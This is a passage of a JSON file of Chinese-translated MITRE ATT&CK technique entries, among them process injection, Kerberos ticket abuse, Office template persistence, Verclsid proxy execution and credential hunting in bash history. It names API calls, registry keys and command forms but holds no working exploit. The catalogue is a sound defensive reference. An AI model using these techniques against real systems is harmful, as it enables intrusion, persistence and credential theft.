        "translated_description": "对手可能会滥用 Microsoft Office 模板在受损系统上获得持久性。Microsoft Office 包含作为常见 Office 应用程序一部分的模板，用于自定义样式。应用程序中的基本模板在每次启动应用程序时使用。(引用: Microsoft Change Normal Template)\n\nOffice Visual Basic for Applications (VBA) 宏 (引用: MSDN VBA in Office) 可以插入到基本模板中，并在相应的 Office 应用程序启动时用于执行代码以获得持久性。Word 和 Excel 的示例已被发现并发布。默认情况下，Word 创建了一个可以修改以包含恶意宏的 Normal.dotm 模板。Excel 默认没有创建模板文件，但可以添加一个模板文件，该文件将在启动时自动加载。(引用: enigma0x3 normal.dotm)(引用: Hexacorn Office Template Macros) 共享模板也可以存储并从远程位置提取。(引用: GlobalDotName Jun 2019)\n\nWord Normal.dotm 位置：<br>\n<code>C:\\Users\\&lt;username&gt;\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm</code>\n\nExcel Personal.xlsb 位置：<br>\n<code>C:\\Users\\&lt;username&gt;\\AppData\\Roaming\\Microsoft\\Excel\\XLSTART\\PERSONAL.XLSB</code>\n\n对手还可以通过劫持应用程序的搜索顺序来更改基本模板的位置，例如 Word 2016 将首先在 <code>C:\\Program Files (x86)\\Microsoft Office\\root\\Office16\\</code> 下查找 Normal.dotm，或通过修改 GlobalDotName 注册表项。通过修改 GlobalDotName 注册表项，对手可以指定一个任意位置、文件名和文件扩展名，用于在应用程序启动时加载的模板。要滥用 GlobalDotName，对手可能首先需要将模板注册为受信任的文档或将其放置在受信任的位置。(引用: GlobalDotName Jun 2019)\n\n根据系统或企业安全策略对宏的使用，对手可能需要启用宏以执行不受限制的操作。"
    },
    "Confluence": {
        "translated_name": "Confluence",
        "translated_description": "对手可能会利用 Confluence 存储库挖掘有价值的信息。通常在开发环境中与 Atlassian JIRA 一起发现，Confluence 通常用于存储与开发相关的文档，但通常可能包含更多类别的有用信息，例如：\n\n* 政策、程序和标准\n* 物理/逻辑网络图\n* 系统架构图\n* 技术系统文档\n* 测试/开发凭据（即[不安全凭据](https://attack.mitre.org/techniques/T1552)）\n* 工作/项目计划\n* 源代码片段\n* 链接到网络共享和其他内部资源\n"
    },
    "Pass the Ticket": {
        "translated_name": "传递票证",
        "translated_description": "对手可能会使用被盗的Kerberos票证“传递票证”在环境中横向移动，绕过正常的系统访问控制。传递票证（PtT）是一种使用Kerberos票证进行系统身份验证的方法，而无需访问账户的密码。Kerberos身份验证可以用作横向移动到远程系统的第一步。\n\n在执行PtT时，通过[操作系统凭据转储](https://attack.mitre.org/techniques/T1003)捕获[有效账户](https://attack.mitre.org/techniques/T1078)的有效Kerberos票证。根据访问级别，可能会获得用户的服务票证或票证授予票证（TGT）。服务票证允许访问特定资源，而TGT可以用于从票证授予服务（TGS）请求服务票证，以访问用户有权限访问的任何资源。(引用: ADSecurity AD Kerberos Attacks)(引用: GentilKiwi Pass the Ticket)\n\n可以为使用Kerberos作为身份验证机制的服务获取[银票](https://attack.mitre.org/techniques/T1558/002)，并用于生成访问特定资源和托管该资源的系统的票证（例如，SharePoint）。(引用: ADSecurity AD Kerberos Attacks)\n\n可以使用密钥分发服务账户KRBTGT账户NTLM哈希为域获取[金票](https://attack.mitre.org/techniques/T1558/001)，这使得可以为Active Directory中的任何账户生成TGT。(引用: Campbell 2014)\n\n对手还可以使用其他用户信息（例如被盗的密码哈希或AES密钥）创建有效的Kerberos票证。例如，“覆盖哈希”涉及使用NTLM密码哈希进行用户身份验证（即[传递哈希](https://attack.mitre.org/techniques/T1550/002)），同时使用密码哈希创建有效的Kerberos票证。(引用: Stealthbits Overpass-the-Hash)"
    },
    "Container Administration Command": {
        "translated_name": "容器管理命令",
        "translated_description": "对手可能会滥用容器管理服务在容器内执行命令。容器管理服务（如Docker守护进程、Kubernetes API服务器或kubelet）可能允许远程管理环境中的容器。(引用: Docker Daemon CLI)(引用: Kubernetes API)(引用: Kubernetes Kubelet)\n\n在Docker中，对手可以在容器部署期间指定一个入口点来执行脚本或命令，或者他们可以使用<code>docker exec</code>命令在运行的容器内执行命令。(引用: Docker Entrypoint)(引用: Docker Exec) 在Kubernetes中，如果对手有足够的权限，他们可以通过与Kubernetes API服务器、kubelet交互或运行<code>kubectl exec</code>命令在集群中的容器中获得远程执行。(引用: Kubectl Exec Get Shell)"
    },
    "File and Directory Discovery": {
        "translated_name": "文件和目录发现",
        "translated_description": "对手可能会枚举文件和目录，或在主机或网络共享的特定位置搜索文件系统中的某些信息。对手可能会在自动化发现期间使用[文件和目录发现](https://attack.mitre.org/techniques/T1083)中的信息来塑造后续行为，包括对手是否完全感染目标和/或尝试特定操作。\n\n许多命令行实用程序可以用于获取此信息。例如包括<code>dir</code>、<code>tree</code>、<code>ls</code>、<code>find</code>和<code>locate</code>。(引用: Windows Commands JPCERT) 自定义工具也可以用于收集文件和目录信息并与[本机API](https://attack.mitre.org/techniques/T1106)交互。对手还可能利用网络设备上的[网络设备CLI](https://attack.mitre.org/techniques/T1059/008)来收集文件和目录信息（例如<code>dir</code>、<code>show flash</code>和/或<code>nvram</code>）。(引用: US-CERT-TA18-106A)\n\n某些文件和目录可能需要提升或特定用户权限才能访问。"
    },
    "Dynamic Resolution": {
        "translated_name": "动态解析",
        "translated_description": "对手可能会动态建立与命令和控制基础设施的连接，以规避常见的检测和补救措施。这可以通过使用与对手用于接收恶意软件通信的基础设施共享通用算法的恶意软件来实现。这些计算可以用于动态调整恶意软件用于命令和控制的参数，例如域名、IP地址或端口号。\n\n对手可能会使用动态解析来实现[回退通道](https://attack.mitre.org/techniques/T1008)。当与主要命令和控制服务器失去联系时，恶意软件可能会使用动态解析作为重新建立命令和控制的一种手段。(引用: Talos CCleanup 2017)(引用: FireEye POSHSPY April 2017)(引用: ESET Sednit 2017 Activity)"
    },
    "Masquerade Task or Service": {
        "translated_name": "伪装任务或服务",
        "translated_description": "对手可能会尝试操纵任务或服务的名称，使其看起来合法或无害。由任务计划程序或systemd执行的任务/服务通常会被赋予一个名称和/或描述。(引用: TechNet Schtasks)(引用: Systemd Service Units) Windows服务将有一个服务名称以及显示名称。许多合法任务和服务存在，具有常见的关联名称。对手可能会给任务或服务起一个类似或相同于合法任务或服务的名称。\n\n任务或服务包含其他字段，例如描述，对手可能会尝试使其看起来合法。(引用: Palo Alto Shamoon Nov 2016)(引用: Fysbis Dr Web Analysis)"
    },
    "Asynchronous Procedure Call": {
        "translated_name": "异步过程调用",
        "translated_description": "对手可能会通过异步过程调用（APC）队列将恶意代码注入进程，以规避基于进程的防御并可能提升权限。APC注入是一种在单独的活动进程的地址空间中执行任意代码的方法。\n\nAPC注入通常通过将恶意代码附加到进程线程的APC队列（引用: Microsoft APC）来执行。排队的APC函数在线程进入可变状态时执行。(引用: Microsoft APC) 首先使用本机Windows API调用（如<code>OpenThread</code>）创建现有受害进程的句柄。此时可以使用<code>QueueUserAPC</code>调用函数（如指向恶意DLL的<code>LoadLibrayA</code>）。\n\n一种称为“早鸟注入”的APC注入变体涉及创建一个挂起的进程，在进程入口点（以及可能的后续反恶意软件钩子）之前通过APC写入和执行恶意代码。(引用: CyberBit Early Bird Apr 2018) AtomBombing (引用: ENSIL AtomBombing Oct 2016) 是另一种变体，利用APC调用先前写入全局原子表的恶意代码。(引用: Microsoft Atom Table)\n\n在另一个进程的上下文中运行代码可能允许访问进程的内存、系统/网络资源，并可能提升权限。通过APC注入执行还可能规避安全产品的检测，因为执行被掩盖在合法进程下。"
    },
    "Traffic Duplication": {
        "translated_name": "流量复制",
        "translated_description": "对手可能会利用流量镜像来自动化通过受损基础设施的数据外传。流量镜像是某些设备的本机功能，通常用于网络分析。例如，可以配置设备将网络流量转发到一个或多个目的地，以便网络分析仪或其他监控设备进行分析。(引用: Cisco Traffic Mirroring)(引用: Juniper Traffic Mirroring)\n\n对手可能会滥用流量镜像来镜像或重定向网络流量通过他们控制的其他基础设施。通过[ROMMONkit](https://attack.mitre.org/techniques/T1542/004)或[补丁系统镜像](https://attack.mitre.org/techniques/T1601/001)可能实现对网络设备的恶意修改以启用流量重定向。(引用: US-CERT-TA18-106A)(引用: Cisco Blog Legacy Device Attacks)\n\n许多基于云的环境也支持流量镜像。例如，AWS流量镜像、GCP数据包镜像和Azure vTap允许用户定义指定的实例以收集流量，并将收集的流量发送到指定的目标。(引用: AWS Traffic Mirroring)(引用: GCP Packet Mirroring)(引用: Azure Virtual Network TAP)\n\n对手可能会将流量复制与[网络嗅探](https://attack.mitre.org/techniques/T1040)、[输入捕获](https://attack.mitre.org/techniques/T1056)或[中间人攻击](https://attack.mitre.org/techniques/T1557)结合使用，具体取决于对手的目标和目的。"
    },
    "Plist File Modification": {
        "translated_name": "Plist 文件修改",
        "translated_description": "对手可能会修改属性列表文件（plist 文件）以启用其他恶意活动，同时可能规避和绕过系统防御。macOS 应用程序使用 plist 文件，例如 <code>info.plist</code> 文件，来存储属性和配置设置，这些设置告知操作系统如何在运行时处理应用程序。Plist 文件是基于 Apple 的 Core Foundation DTD 格式化的 XML 中的键值对结构化元数据。Plist 文件可以以文本或二进制格式保存。(引用: fileinfo plist file description) \n\n对手可以修改 plist 文件中的键值对以影响系统行为，例如隐藏应用程序的执行（即 [隐藏窗口](https://attack.mitre.org/techniques/T1564/003)）或运行其他命令以实现持久性（例如 [启动代理](https://attack.mitre.org/techniques/T1543/001)/[启动守护程序](https://attack.mitre.org/techniques/T1543/004) 或 [重新打开的应用程序](https://attack.mitre.org/techniques/T1547/007)）。\n\n例如，对手可以将恶意应用程序路径添加到 `~/Library/Preferences/com.apple.dock.plist` 文件中，该文件控制出现在 Dock 中的应用程序。对手还可以修改应用程序 <code>info.plist</code> 文件中的 <code>LSUIElement</code> 键以在后台运行应用程序。对手还可以插入键值对以插入环境变量，例如 <code>LSEnvironment</code>，以通过 [动态链接器劫持](https://attack.mitre.org/techniques/T1574/006) 实现持久性。(引用: wardle chp2 persistence)(引用: eset_osx_flashback)"
    },
    "AppCert DLLs": {
        "translated_name": "AppCert DLLs",
        "translated_description": "对手可能通过执行由 AppCert DLLs 触发的恶意内容来建立持久性和/或提升权限。在 <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\</code> 下的 <code>AppCertDLLs</code> 注册表项中指定的动态链接库 (DLL) 会加载到每个调用广泛使用的应用程序编程接口 (API) 函数 <code>CreateProcess</code>、<code>CreateProcessAsUser</code>、<code>CreateProcessWithLoginW</code>、<code>CreateProcessWithTokenW</code> 或 <code>WinExec</code> 的进程中。(引用: Elastic Process Injection July 2017)\n\n类似于 [进程注入](https://attack.mitre.org/techniques/T1055)，可以滥用此值通过在计算机上的单独进程上下文中加载和运行恶意 DLL 来获得提升的权限。恶意 AppCert DLLs 还可以通过 API 活动不断触发来提供持久性。"
    },
    "Email Forwarding Rule": {
        "translated_name": "电子邮件转发规则",
        "translated_description": "对手可能会设置电子邮件转发规则以收集敏感信息。对手可能会滥用电子邮件转发规则来监视受害者的活动、窃取信息，并进一步获取有关受害者或受害者组织的情报，以用于进一步的攻击或操作。(引用: US-CERT TA18-068A 2018) 此外，即使管理员重置了被破坏的凭据，电子邮件转发规则也可以让对手保持对受害者电子邮件的持续访问。(引用: Pfammatter - Hidden Inbox Rules) 大多数电子邮件客户端允许用户创建收件箱规则以执行各种电子邮件功能，包括转发到不同的收件人。这些规则可以通过本地电子邮件应用程序、Web 界面或命令行界面创建。消息可以转发给内部或外部收件人，并且没有限制此规则的范围。管理员也可以为用户帐户创建转发规则，具有相同的考虑和结果。(引用: Microsoft Tim McMichael Exchange Mail Forwarding 2)(引用: Mac Forwarding Rules)\n\n组织内的任何用户或管理员（或具有有效凭据的对手）都可以创建规则以自动将所有接收的消息转发给另一个收件人、根据发件人将电子邮件转发到不同的位置等。对手还可以利用 Microsoft Messaging API (MAPI) 修改规则属性，使其隐藏且在 Outlook、OWA 或大多数 Exchange 管理工具中不可见。(引用: Pfammatter - Hidden Inbox Rules)\n\n在某些环境中，管理员可能能够启用组织范围内而不是单个收件箱上的电子邮件转发规则。例如，Microsoft Exchange 支持传输规则，这些规则根据用户指定的条件评估组织接收的所有邮件，然后对符合这些条件的邮件执行用户指定的操作。(引用: Microsoft Mail Flow Rules 2023) 滥用此类功能的对手可能能够启用对组织接收的所有或特定邮件的转发。"
    },
    "Data Staged": {
        "translated_name": "数据分阶段",
        "translated_description": "对手可能会在外传之前将收集的数据分阶段存储在中央位置或目录中。数据可以保存在单独的文件中，也可以通过技术（例如 [归档收集的数据](https://attack.mitre.org/techniques/T1560)）合并到一个文件中。可以使用交互式命令外壳，并且可以使用 [cmd](https://attack.mitre.org/software/S0106) 和 bash 中的常见功能将数据复制到分阶段位置。(引用: PWC Cloud Hopper April 2017)\n\n在云环境中，对手可能会在外传之前将数据分阶段存储在特定实例或虚拟机中。对手可能会 [创建云实例](https://attack.mitre.org/techniques/T1578/002) 并在该实例中分阶段存储数据。(引用: Mandiant M-Trends 2020)\n\n对手可能会选择在外传之前将受害者网络中的数据分阶段存储在集中位置，以最大限度地减少与其 C2 服务器建立连接的次数，并更好地规避检测。"
    },
    "Steal or Forge Authentication Certificates": {
        "translated_name": "窃取或伪造身份验证证书",
        "translated_description": "对手可能会窃取或伪造用于身份验证的证书，以访问远程系统或资源。数字证书通常用于签名和加密消息和/或文件。证书也用作身份验证材料。例如，Entra ID 设备证书和 Active Directory 证书服务 (AD CS) 证书绑定到一个身份，并且可以用作域帐户的凭据。(引用: O365 Blog Azure AD Device IDs)(引用: Microsoft AD CS Overview)\n\n身份验证证书可以被窃取和伪造。例如，可以从加密存储（在注册表或文件中）(引用: APT29 Deep Look at Credential Roaming)、放错位置的证书文件（即 [不安全凭据](https://attack.mitre.org/techniques/T1552)）或通过各种加密 API 直接从 Windows 证书存储中窃取 AD CS 证书。(引用: SpecterOps Certified Pre Owned)(引用: GitHub CertStealer)(引用: GitHub GhostPack Certificates) 具有适当注册权限的用户和/或计算机可以从企业证书颁发机构 (CA) 请求和/或手动更新证书。此注册过程定义了与证书相关的各种设置和权限。值得注意的是，证书的扩展密钥用法 (EKU) 值定义了签名、加密和身份验证用例，而证书的主题备用名称 (SAN) 值定义了证书所有者的备用名称。(引用: Medium Certified Pre Owned)\n\n滥用证书作为身份验证凭据可能会启用其他行为，例如 [横向移动](https://attack.mitre.org/tactics/TA0008)。证书相关的配置错误也可能通过允许用户通过与证书关联的身份 (SAN) 模拟或承担特权帐户或权限来启用 [权限提升](https://attack.mitre.org/tactics/TA0004) 的机会。这些滥用还可能通过窃取或伪造可用作 [有效帐户](https://attack.mitre.org/techniques/T1078) 的证书在证书有效期内启用 [持久性](https://attack.mitre.org/tactics/TA0003)，尽管用户密码已重置。身份验证证书也可以被窃取和伪造用于计算机帐户。\n\n对手如果能够访问根（或从属）CA 证书私钥（或保护/管理这些密钥的机制），还可以通过伪造受害者域的任意身份验证证书（称为“黄金”证书）建立 [持久性](https://attack.mitre.org/tactics/TA0003)。(引用: Medium Certified Pre Owned) 对手还可能针对证书和相关服务以访问其他形式的凭据，例如 [黄金票证](https://attack.mitre.org/techniques/T1558/001) 票证授予票证 (TGT) 或 NTLM 明文。(引用: Medium Certified Pre Owned)"
    },
    "Device Registration": {
        "translated_name": "设备注册",
        "translated_description": "对手可能会将设备注册到对手控制的帐户。设备可以注册到多因素身份验证 (MFA) 系统，该系统处理对网络的身份验证，或注册到设备管理系统，该系统处理设备访问和合规性。\n\nMFA 系统（例如 Duo 或 Okta）允许用户将设备与其帐户关联，以完成 MFA 要求。对手如果破坏了用户的凭据，可能会注册新设备以绕过初始 MFA 要求并获得对网络的持续访问。(引用: CISA MFA PrintNightmare)(引用: DarkReading FireEye SolarWinds) 在某些情况下，MFA 自助注册过程可能只需要用户名和密码即可注册帐户的第一个设备或注册到不活跃的帐户。(引用: Mandiant APT29 Microsoft 365 2022)\n\n同样，具有现有网络访问权限的对手可能会将设备注册到 Entra ID 和/或其设备管理系统 Microsoft Intune，以便在绕过条件访问策略的情况下访问敏感数据或资源。(引用: AADInternals - Device Registration)(引用: AADInternals - Conditional Access Bypass)(引用: Microsoft DEV-0537) \n\n注册到 Entra ID 的设备可能能够通过组织内部电子邮件进行 [内部鱼叉式网络钓鱼](https://attack.mitre.org/techniques/T1534) 活动，这些电子邮件不太可能被电子邮件客户端视为可疑。(引用: Microsoft - Device Registration) 此外，对手可能能够通过注册大量设备对 Entra ID 租户执行 [服务耗尽泛洪](https://attack.mitre.org/techniques/T1499/002)。(引用: AADInternals - BPRT)"
    },
    "System Network Connections Discovery": {
        "translated_name": "系统网络连接发现",
        "translated_description": "对手可能会尝试获取当前访问的受损系统或通过网络查询远程系统的网络连接列表。\n\n获得云环境一部分的系统访问权限的对手可能会映射虚拟私有云或虚拟网络，以确定连接了哪些系统和服务。执行的操作可能是相同类型的发现技术，具体取决于操作系统，但结果信息可能包括有关与对手目标相关的网络云环境的详细信息。云提供商可能有不同的虚拟网络操作方式。(引用: Amazon AWS VPC Guide)(引用: Microsoft Azure Virtual Network Overview)(引用: Google VPC Overview) 同样，获得网络设备访问权限的对手也可能执行类似的发现活动，以收集有关连接系统和服务的信息。\n\n获取此信息的实用程序和命令包括 [netstat](https://attack.mitre.org/software/S0104)、“net use”和“net session”与 [Net](https://attack.mitre.org/software/S0039)。在 Mac 和 Linux 中，[netstat](https://attack.mitre.org/software/S0104) 和 <code>lsof</code> 可用于列出当前连接。<code>who -a</code> 和 <code>w</code> 可用于显示当前登录的用户，类似于“net session”。此外，网络设备本机功能和 [网络设备 CLI](https://attack.mitre.org/techniques/T1059/008) 也可用于（例如 <code>show ip sockets</code>、<code>show tcp brief</code>）。(引用: US-CERT-TA18-106A)"
    },
    "Compromise Infrastructure": {
        "translated_name": "妥协基础设施",
        "translated_description": "对手可能会妥协可以在目标过程中使用的第三方基础设施。基础设施解决方案包括物理或云服务器、域名、网络设备和第三方 Web 和 DNS 服务。对手可能会妥协基础设施并在对手生命周期的其他阶段使用它，而不是购买、租赁或租用基础设施。(引用: Mandiant APT1)(引用: ICANNDomainNameHijacking)(引用: Talos DNSpionage Nov 2018)(引用: FireEye EPS Awakens Part 2) 此外，对手可能会妥协大量机器以形成他们可以利用的僵尸网络。\n\n使用妥协的基础设施允许对手阶段性、启动和执行操作。妥协的基础设施可以帮助对手操作与被视为正常的流量（例如与高信誉或受信任站点的联系）融合。例如，对手可能会利用妥协的基础设施（可能还结合[数字证书](https://attack.mitre.org/techniques/T1588/004)）进一步融合并支持阶段性信息收集和/或[网络钓鱼](https://attack.mitre.org/techniques/T1566)活动。(引用: FireEye DNS Hijack 2019) 此外，对手还可能妥协基础设施以支持[代理](https://attack.mitre.org/techniques/T1090)和/或代理服务。(引用: amnesty_nso_pegasus)(引用: Sysdig Proxyjacking)\n\n通过使用妥协的基础设施，对手可能会使其行为难以追溯到他们。在目标之前，对手可能会妥协其他对手的基础设施。(引用: NSA NCSC Turla OilRig)"
    },
    "Mark-of-the-Web Bypass": {
        "translated_name": "绕过网页标记",
        "translated_description": "对手可能会滥用特定文件格式来规避网页标记 (MOTW) 控制。在 Windows 中，从 Internet 下载的文件会被标记为具有特定值的隐藏 NTFS 替代数据流 (ADS)，称为 MOTW。(引用: Microsoft Zone.Identifier 2020) 标记为 MOTW 的文件受到保护，无法执行某些操作。例如，从 MS Office 10 开始，如果 MS Office 文件具有 MOTW，它将以受保护视图打开。标记为 MOTW 的可执行文件将由 Windows Defender SmartScreen 处理，SmartScreen 会将文件与知名可执行文件的允许列表进行比较。如果文件未知/不受信任，SmartScreen 将阻止执行并警告用户不要运行它。(引用: Beek Use of VHD Dec 2020)(引用: Outflank MotW 2020)(引用: Intezer Russian APT Dec 2020)\n\n对手可能会滥用容器文件，例如压缩/归档 (.arj, .gzip) 和/或磁盘映像 (.iso, .vhd) 文件格式来传递可能未标记为 MOTW 的恶意有效载荷。从 Internet 下载的容器文件将被标记为 MOTW，但其中的文件在提取和/或挂载后可能不会继承 MOTW。MOTW 是 NTFS 功能，许多容器文件不支持 NTFS 替代数据流。容器文件提取和/或挂载后，其中包含的文件可能被视为磁盘上的本地文件并在没有保护的情况下运行。(引用: Beek Use of VHD Dec 2020)(引用: Outflank MotW 2020)"
    },
    "Disable Crypto Hardware": {
        "translated_name": "禁用加密硬件",
        "translated_description": "对手禁用网络设备的专用硬件加密，这可能使他们能够利用软件加密中的弱点，以减少收集、操纵和外传传输数据所涉及的工作量。\n\n许多网络设备（如路由器、交换机和防火墙）对网络流量进行加密，以确保跨网络的传输安全。通常，这些设备配备了专用的加密硬件，以大大提高加密过程的速度，并防止恶意篡改。当对手控制此类设备时，他们可能会禁用专用硬件，例如，通过使用[修改系统镜像](https://attack.mitre.org/techniques/T1601)，强制使用软件在通用处理器上执行加密。这通常与攻击结合使用，以削弱软件中密码的强度（例如，[减少密钥空间](https://attack.mitre.org/techniques/T1600/001)）。(引用: Cisco Blog Legacy Device Attacks)"
    },
    "Pre-OS Boot": {
        "translated_name": "操作系统启动前",
        "translated_description": "对手可能会滥用操作系统启动前的机制，作为在系统上建立持久性的一种方式。在计算机的启动过程中，固件和各种启动服务在操作系统加载之前加载。这些程序在操作系统接管之前控制执行流程。(引用: Wikipedia Booting)\n\n对手可能会覆盖启动驱动程序或固件（如 BIOS（基本输入/输出系统）和统一可扩展固件接口（UEFI））中的数据，以在操作系统下的层面上持久存在于系统上。这可能特别难以检测，因为此级别的恶意软件不会被主机软件防御检测到。"
    },
    "Build Image on Host": {
        "translated_name": "在主机上构建镜像",
        "translated_description": "对手可能会直接在主机上构建容器镜像，以绕过监控从公共注册表检索恶意镜像的防御。可以向 Docker API 发送远程<code>build</code>请求，其中包含一个 Dockerfile，该文件从公共或本地注册表中提取一个普通基础镜像（例如 alpine），然后在其上构建自定义镜像。(引用: Docker Build Image)\n\n对手可能会利用该<code>build</code> API 在主机上构建一个包含从其 C2 服务器下载的恶意软件的自定义镜像，然后他们可能会利用[部署容器](https://attack.mitre.org/techniques/T1610)使用该自定义镜像。(引用: Aqua Build Images on Hosts)(引用: Aqua Security Cloud Native Threat Report June 2021) 如果基础镜像是从公共注册表中提取的，防御措施可能不会将镜像检测为恶意镜像，因为它是普通镜像。如果基础镜像已经存在于本地注册表中，则提取可能被认为更不引人注意，因为镜像已经在环境中。"
    },
    "Portable Executable Injection": {
        "translated_name": "可移植可执行文件注入",
        "translated_description": "对手可能会将可移植可执行文件 (PE) 注入进程中，以规避基于进程的防御并可能提升权限。PE 注入是一种在单独的活动进程的地址空间中执行任意代码的方法。\n\nPE 注入通常通过将代码（可能没有磁盘上的文件）复制到目标进程的虚拟地址空间中，然后通过新线程调用它来执行。可以使用本机 Windows API 调用（例如<code>VirtualAllocEx</code>和<code>WriteProcessMemory</code>）执行写入，然后使用<code>CreateRemoteThread</code>或其他代码（例如 shellcode）调用。注入代码的位移引入了重新映射内存引用的附加要求。(引用: Elastic Process Injection July 2017)\n\n在另一个进程的上下文中运行代码可能允许访问进程的内存、系统/网络资源，并可能提升权限。通过 PE 注入执行还可能规避安全产品的检测，因为执行被掩盖在合法进程下。"
    },
    "Verclsid": {
        "translated_name": "Verclsid",
        "translated_description": "对手可能会滥用 verclsid.exe 代理执行恶意代码。Verclsid.exe 被称为扩展 CLSID 验证主机，负责在 Windows 资源管理器或 Windows Shell 使用之前验证每个 shell 扩展。(引用: WinOSBite verclsid.exe)\n\n对手可能会滥用 verclsid.exe 执行恶意有效载荷。这可以通过运行<code>verclsid.exe /S /C {CLSID}</code>来实现，其中文件由类 ID (CLSID) 引用，CLSID 是用于标识 COM 对象的唯一标识号。由 verclsid.exe 执行的 COM 有效载荷可能能够执行各种恶意操作，例如从远程服务器加载和执行 COM 脚本（类似于[Regsvr32](https://attack.mitre.org/techniques/T1218/010)）。由于二进制文件可能已签名和/或本机存在于 Windows 系统上，通过 verclsid.exe 代理执行可能会绕过未考虑其潜在滥用的应用程序控制解决方案。(引用: LOLBAS Verclsid)(引用: Red Canary Verclsid.exe)(引用: BOHOPS Abusing the COM Registry)(引用: Nick Tyrer GitHub)"
    },
    "Compromise Accounts": {
        "translated_name": "妥协账户",
        "translated_description": "对手可能会妥协可以在目标过程中使用的服务账户。对于包含社会工程的操作，使用在线身份可能很重要。与其创建和培养账户（即[建立账户](https://attack.mitre.org/techniques/T1585)），对手可能会妥协现有账户。利用现有身份可能会在潜在受害者中产生一定的信任，如果他们与被妥协的身份有关系或了解。\n\n存在多种妥协账户的方法，例如通过[钓鱼获取信息](https://attack.mitre.org/techniques/T1598)收集凭据，从第三方网站购买凭据，暴力破解凭据（例如：从泄露的凭据转储中重用密码），或支付员工、供应商或业务合作伙伴以获取凭据。(引用: AnonHBGary)(引用: Microsoft DEV-0537) 在妥协账户之前，对手可能会进行侦察，以获取有关哪些账户可以妥协以进一步操作的决策信息。\n\n身份可能存在于单个站点或多个站点（例如：Facebook、LinkedIn、Twitter、Google 等）。妥协的账户可能需要进一步开发，这可能包括填写或修改个人资料信息，进一步发展社交网络，或包含照片。\n\n对手可能会直接利用妥协的电子邮件账户进行[钓鱼获取信息](https://attack.mitre.org/techniques/T1598)或[钓鱼](https://attack.mitre.org/techniques/T1566)。"
    },
    "Launchctl": {
        "translated_name": "Launchctl",
        "translated_description": "对手可能会滥用 launchctl 执行命令或程序。Launchctl 与 launchd 交互，这是 macOS 的服务管理框架。Launchctl 支持在命令行上、交互式或甚至从标准输入重定向时接受子命令。(引用: Launchctl Man)\n\n对手使用 launchctl 作为[启动代理](https://attack.mitre.org/techniques/T1543/001)或[启动守护程序](https://attack.mitre.org/techniques/T1543/004)执行命令和程序。常见的子命令包括：<code>launchctl load</code>、<code>launchctl unload</code> 和 <code>launchctl start</code>。对手可以使用脚本或手动运行命令 <code>launchctl load -w \"%s/Library/LaunchAgents/%s\"</code> 或 <code>/bin/launchctl load</code> 来执行[启动代理](https://attack.mitre.org/techniques/T1543/001)或[启动守护程序](https://attack.mitre.org/techniques/T1543/004)。(引用: Sofacy Komplex Trojan)(引用: 20 macOS Common Tools and Techniques)"
    },
    "Network Device CLI": {
        "translated_name": "网络设备 CLI",
        "translated_description": "对手可能会滥用网络设备上的脚本或内置命令行解释器 (CLI) 执行恶意命令和负载。CLI 是用户和管理员与设备交互的主要方式，用于查看系统信息、修改设备操作或执行诊断和管理功能。CLI 通常包含执行不同命令所需的各种权限级别。\n\n脚本解释器自动化任务并扩展了网络操作系统中包含的命令集之外的功能。CLI 和脚本解释器可以通过直接控制台连接或通过远程方式（如 telnet 或 [SSH](https://attack.mitre.org/techniques/T1021/004)）访问。\n\n对手可以使用网络 CLI 更改网络设备的行为和操作。CLI 可用于操纵流量流以拦截或操纵数据，修改启动配置参数以加载恶意系统软件，或禁用安全功能或日志记录以避免检测。(引用: Cisco Synful Knock Evolution)"
    },
    "Bash History": {
        "translated_name": "Bash 历史记录",
        "translated_description": "对手可能会在受损系统上搜索 bash 命令历史记录以查找不安全存储的凭据。Bash 使用“历史记录”实用程序跟踪用户在命令行上键入的命令。一旦用户注销，历史记录将刷新到用户的 <code>.bash_history</code> 文件中。对于每个用户，此文件位于相同位置：<code>~/.bash_history</code>。通常，此文件跟踪用户的最后 500 个命令。用户经常在命令行上将用户名和密码作为程序的参数键入，这些参数在他们注销时保存到此文件中。对手可以通过查看文件中的潜在凭据来滥用这一点。(引用: External to DA, the OS X Way)"
    },
    "Downgrade Attack": {
        "translated_name": "降级攻击",
        "translated_description": "对手可能会降级或使用系统功能的版本，这些版本可能已过时、存在漏洞和/或不支持更新的安全控制。降级攻击通常利用系统的向后兼容性，将其强制为不太安全的操作模式。\n\n对手可能会降级并使用系统功能的各种不太安全的版本，例如[命令和脚本解释器](https://attack.mitre.org/techniques/T1059)或甚至可以被滥用以启用[中间人攻击](https://attack.mitre.org/techniques/T1557)或[网络嗅探](https://attack.mitre.org/techniques/T1040)的网络协议。(引用: Praetorian TLS Downgrade Attack 2014) 例如，[PowerShell](https://attack.mitre.org/techniques/T1059/001) 版本 5+ 包括脚本块日志记录 (SBL)，可以记录执行的脚本内容。然而，对手可能会尝试执行不支持 SBL 的早期版本的 PowerShell，目的是在运行可能被检测到的恶意脚本时[削弱防御](https://attack.mitre.org/techniques/T1562)。(引用: CrowdStrike BGH Ransomware 2021)(引用: Mandiant BYOL 2018)(引用: att_def_ps_logging)\n\n对手可能同样会针对网络流量，从加密的 HTTPS 连接降级到暴露网络数据的非加密 HTTP 连接。(引用: Targeted SSL Stripping Attacks Are Real)(引用: Crowdstrike Downgrade)"
    },
    "XPC Services": {
        "translated_name": "XPC 服务",
        "translated_description": "对手可以向 XPC 服务守护程序提供恶意内容以进行本地代码执行。macOS 使用 XPC 服务进行各种进程之间的基本进程间通信，例如在 XPC 服务守护程序和第三方应用程序特权帮助工具之间。应用程序可以使用低级 XPC 服务 <code>C API</code> 或高级 <code>NSXPCConnection API</code> 向 XPC 服务守护程序发送消息，该守护程序以 root 身份运行，以处理需要提升权限的任务（例如网络连接）。应用程序负责提供协议定义，该定义作为 XPC 服务的蓝图。开发人员通常使用 XPC 服务为应用程序提供稳定性和应用程序客户端与守护程序之间的权限分离。(引用: creatingXPCservices)(引用: Designing Daemons Apple Dev)\n\n对手可以滥用 XPC 服务执行恶意内容。恶意执行请求可以通过应用程序的 XPC 服务处理程序传递。(引用: CVMServer Vuln)(引用: Learn XPC Exploitation) 这还可能包括识别和滥用不正确的 XPC 客户端验证和/或不良的输入参数清理以进行[特权提升的利用](https://attack.mitre.org/techniques/T1068)。"
    },
    "Virtualization/Sandbox Evasion": {
        "translated_name": "虚拟化/沙箱规避",
